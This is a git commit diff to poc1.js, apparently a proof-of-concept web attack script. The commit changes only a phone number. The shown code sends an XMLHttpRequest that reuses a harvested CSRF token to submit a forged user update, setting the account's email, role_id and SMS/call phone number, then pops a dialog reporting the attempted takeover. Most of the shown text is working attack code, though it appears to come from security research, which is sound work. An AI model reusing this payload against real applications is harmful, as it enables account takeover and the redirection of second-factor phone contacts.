0e4ab06048d5a324703befdb3f19a7d316340528
Craig Arendt <craigarendt@users.noreply.github.com>
2015-05-06 12:54:31 -0400

    Update poc1.js

--- poc1.js
+++ poc1.js
@@ -12,7 +12,7 @@ for (i=0; i<meta.length; i++) {
     xmlhttp.setRequestHeader("X-CSRF-Token", csrfToken);
     xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
     
-    xmlhttp.send("utf8=%E2%9C%93&_method=put&authenticity_token="+encodeURI(csrfToken)+"&user%5Bfirst_name%5D=First&user%5Blast_name%5D=Last&user%5Brole_id%5D=3&user%5Benabled%5D=true&user%5Bemail%5D=user%40stratumsecurity.com&user_mobile_phone%5Bcountry%5D=US&user_mobile_phone%5Bphone_number%5D=2024556339&user_mobile_phone%5Baccepts_sms%5D=0&user_mobile_phone%5Baccepts_sms%5D=1&user_mobile_phone%5Baccepts_calls%5D=0&user_mobile_phone%5Baccepts_calls%5D=1&commit=Update+User");
+    xmlhttp.send("utf8=%E2%9C%93&_method=put&authenticity_token="+encodeURI(csrfToken)+"&user%5Bfirst_name%5D=First&user%5Blast_name%5D=Last&user%5Brole_id%5D=3&user%5Benabled%5D=true&user%5Bemail%5D=user%40stratumsecurity.com&user_mobile_phone%5Bcountry%5D=US&user_mobile_phone%5Bphone_number%5D=2024666338&user_mobile_phone%5Baccepts_sms%5D=0&user_mobile_phone%5Baccepts_sms%5D=1&user_mobile_phone%5Baccepts_calls%5D=0&user_mobile_phone%5Baccepts_calls%5D=1&commit=Update+User");
   }
 }
 confirm("We tried to update: " + account + " using " + csrfToken);
